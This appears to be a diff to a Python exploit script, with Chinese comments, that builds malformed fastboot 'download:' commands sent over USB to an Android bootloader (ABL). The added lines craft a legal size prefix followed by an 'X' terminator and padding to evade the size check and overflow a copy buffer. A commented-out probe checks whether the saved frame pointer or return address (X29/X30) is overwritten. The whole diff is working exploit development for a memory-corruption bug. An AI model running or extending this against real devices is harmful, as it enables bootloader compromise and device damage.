@@ -132,13 +132,26 @@ def probe_via_usb(lengths, verbose=False):
 
     for length in lengths:
         # ── 构造畸形 download 命令 ──
-        # 正常格式: "download:XXXXXXXX" (8位16进制)
-        # 我们需要绕过大小检查: 前缀必须是一个合法的较小数值
-        # `00001000` = 4096 字节。
+        # 根据专家的建议：使用合法的 8 字节前缀 + 一个非十六进制截断符 (如 'X')
+        # 可以欺骗 ABL 的大小校验，但紧接着利用其弱拷贝逻辑实现无报错溢出！
+        # 也就是： "download:00001000X" + 填充
+        
+        # 为了探测 Data Abort Oracle:
+        # 我们把溢出的部分替换为安全的地址 `0x80000000` 转 ASCII (`3830303030...`) 
+        # 来判断究竟是覆写了 X29 还是 X30。
+        safe_addr_str = "80000000"
+        
         if length <= 8:
             hex_payload = "00001000"[:length] 
         else:
-            hex_payload = "00001000" + "A" * (length - 8)
+            # 8字节合法大小 + 1字节截断符 'X' + 'A'填充 / 探针
+            padding_len = length - 9
+            if padding_len <= 0:
+                hex_payload = "00001000" + "X"[:padding_len+1]
+            else:
+                hex_payload = "00001000" + "X" + "A" * padding_len
+                # 如果我们要利用 Data Abort Oracle 探测：
+                # hex_payload = "00001000" + "X" + safe_addr_str * (padding_len // 8)
             
         raw_cmd = f"download:{hex_payload}"
 
